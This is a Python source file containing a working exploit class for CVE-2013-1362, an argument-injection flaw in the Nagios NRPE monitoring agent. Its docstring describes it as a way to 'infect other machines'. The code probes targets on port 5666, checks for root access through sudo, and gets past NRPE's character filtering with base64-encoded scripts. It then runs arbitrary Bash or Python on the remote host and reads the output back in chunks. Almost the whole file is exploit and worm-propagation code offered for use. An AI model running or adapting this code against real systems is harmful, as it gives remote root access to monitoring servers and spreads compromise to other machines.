#!/usr/bin/env python3

import re
import math
import base64
import random
import string
import socket
import subprocess

class NRPExploit:
    """Allows program to infect other machines by using CVE-2013-1362
    Based on this exploit :
        https://www.exploit-db.com/exploits/24955
        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/nagios_nrpe_arguments.rb
    """

    def __init__(self, target):
        """Constructor. User must submit target IP.
        """
        self.nrpecmd = None
        self.host_vulnerable = None

        if re.search(r"^10\.0\.\d{1,3}\.\d{1,3}$", target):
            self.target_host = target
            self.target_port = 5666
        else:
            raise Exception('Target IP format is not valid')

    """
    ========================================================================
        Helpers
    ========================================================================
    """

    def _strcmd(self, cmd):
        """Executes a shell command - locally -, and returns a tuple composed
        by the exit code and the output of the command.
        """
        #print(cmd)
        return subprocess.getstatusoutput(cmd)

    def _single_nrpe_command(self, cmd, nrpecmd=None):
        """Uses NRPE to execute a single command on the remote server.
        Returns exit code and output of the check_nrpe command.
        """
        if nrpecmd is None:
            nrpecmd = self.nrpecmd

        return self._strcmd(
            '/usr/local/nagios/libexec/check_nrpe -H ' + self.target_host + ' -c ' + nrpecmd + r' -a 0 "\$(' + cmd + ')"'
        )

    def _nrpecmd(self, script, needoutput=True):
        """Uses NRPE to execute a script on the remote target server.
        Returns the output of the executed script (or nothing).
        """
        if self.host_vulnerable is None:
            raise Exception('You need to first check if remote host is vulnerable with check_target()')
        elif self.nrpecmd is None:
            raise Exception('Remote host is not vulnerable')

        # As we can't manipulate chars like |`&><'\"\\[]{}; (filtered by NRPE),
        # we can't directly get output and exit code of the script. We will use
        # an intermediate script to manage all of this. The intermediate script,
        # in Bash, will trigger the real script, and redirect its output to a
        # file... which we'll read later :)

        real_script_b64 = self._b64se(script)
        real_script_file = '/tmp/nrpexploit-' + ''.join(random.choice(string.ascii_letters) for i in range(10))
        real_script_fileb64 = real_script_file + '.b64'
        real_script_output_file = real_script_file + '.output'
        intermediate_script = (
            r'base64 -d ' + real_script_fileb64 + ' > ' + real_script_file +
            ';sudo chmod +x ' + real_script_file +
            ';sudo ' + real_script_file + r' 1>' + real_script_output_file + r' 2>&1'
        )
        intermediate_script_b64 = self._b64se(intermediate_script)

        self._strcmd(
            '/usr/local/nagios/libexec/check_nrpe -H ' + self.target_host +
            ' -c ' + self.nrpecmd + ' -a 0 ' +
            r'"\$(' +
            # Save real script in a file (b64 content)
            r'\$(cp -f /etc/passwd ' + real_script_fileb64 + ')' +
            r'\$(sed 1i' + real_script_b64 + ' -i ' + real_script_fileb64 + ')' +
            r'\$(sed q -i ' + real_script_fileb64 + ')' +
            # Save intermediate script (b64 content)
            r'\$(rm -f /tmp/\$\$)' +
            r'\$(cp -f /etc/passwd /tmp/\$\$)' +
            r'\$(sed 1i' + intermediate_script_b64 + r' -i /tmp/\$\$)' +
            r'\$(sed q -i /tmp/\$\$)' +
            # Exec intermediate script
            # (the intermediate script does the job to decode the real script,
            # execute it and redirect stdout&err to the output file)
            r'\$(eval \$(base64 -d /tmp/\$\$))' +
            r'\$(kill -9 \$\$)' +
            # Remove tmp files (we just keep the output file)
            r'\$(rm -f /tmp/\$\$ ' + real_script_file + ' ' + real_script_fileb64 + ')' +
            r')"'
        )

        # Read the output of the executed script
        if needoutput:
            output = self._read_remote_file(real_script_output_file)

        # Remove output file
        self._single_nrpe_command('sudo rm -f ' + real_script_output_file)

        return output if needoutput else None

    def _read_remote_file(self, filepath):
        """Reads the content of a file on remote host.
        """

        # First we need to convert the file to read in base64 (easier to get its content)
        # We split lines by 950 chars
        # 950 = total number of bytes we can extract per NRPE request
        # (because 1024 is the maximum output line length, minus legit text)
        # This means we won't be able to extract more than 950 chars per NRPE request
        # Doing that we will extract file content line by line (950 chars per 950 chars)
        self._nrpecmd(
            'base64 -w 950 ' + filepath + ' > ' + filepath + '.tmpb64;' +
            'wc -l ' + filepath + r'.tmpb64 | awk "{print \$1}" > ' + filepath + '.tmplines',
            False
        )

        # Then we get the file's number of lines
        __, result = self._single_nrpe_command('sudo cat ' + filepath + '.tmplines')
        lines = self._parse_nrpe_output(result)
        #print(lines)
        lines = int(lines)

        finalcontent = ""
        if lines:
            b64content = ""

            # Reading base64 content line by line
            for line in range(1, lines+1):
                line = str(line)

                # We must extract the line in an intermediate file (before reading it),
                # because of "!" in sed command causing an error
                self._nrpecmd(
                    "sed '" + line + "!d' " + filepath + ".tmpb64 > " + filepath + ".tmpb64." + line,
                    False
                )
                __, result = self._single_nrpe_command('sudo cat ' + filepath + '.tmpb64.' + line)
                b64content += self._parse_nrpe_output(result)

            # Get in cleartext :)
            #print(b64content)
            finalcontent = self._unb64se(b64content)

        # Remove tmp files
        self._single_nrpe_command('sudo rm -f ' + filepath + '.tmpb64 ' + filepath + '.tmpb64.* ' + filepath + '.tmplines')

        return finalcontent

    def _parse_nrpe_output(self, nrpeoutput):
        """Parses the NRPE output to extract useful information.
        """
        tmp = nrpeoutput.split('|')

        if len(tmp) == 2:
            tmp = tmp[1].split(';')

            if len(tmp) == 4:
                tmp = tmp[2]

            return tmp

        return tmp[0]

    def _b64se(self, txt):
        """Base 64 ENcodes a string (from cleartext-string to base64-string).
        """
        return base64.b64encode(txt.encode('utf8')).decode('utf8')

    def _unb64se(self, b64encoded):
        """Base 64 DEcodes a string (from base64-string to cleartext-string).
        """
        return base64.b64decode(b64encoded.encode('utf8')).decode('utf8')


    """
    ========================================================================
        Functions
    ========================================================================
    """

    def check_target(self):
        """Checks if the remote host has a NRPE listener and is
        vulnerable to the CVE.
        """
        self.host_vulnerable = False

        try:
            # Test Port 5666 (NRPE listener)
            socket.create_connection(
                address=(self.target_host, self.target_port),
                timeout=2
            ).close()

            # Test CVE exploitation
            totry = ['check_users', 'check_procs']
            for nrpecmd in totry:
                __, check = self._single_nrpe_command('whoami', nrpecmd=nrpecmd)
                __, check2 = self._single_nrpe_command('sudo whoami', nrpecmd=nrpecmd)

                if re.search(r";nagios;", check) and re.search(r";root;", check2):
                    self.host_vulnerable = True
                    self.nrpecmd = nrpecmd
                    break
        except:
            pass

        return self.host_vulnerable

    def exec_remote_bash_script(self, script):
        """Executes a Bash script on the remote target.
        """
        return self._nrpecmd("#!/bin/bash\n" + script)

    def exec_remote_python_script(self, script):
        """Executes a Python script on the remote target.
        """
        return self._nrpecmd("#!/usr/bin/env python3\n" + script)
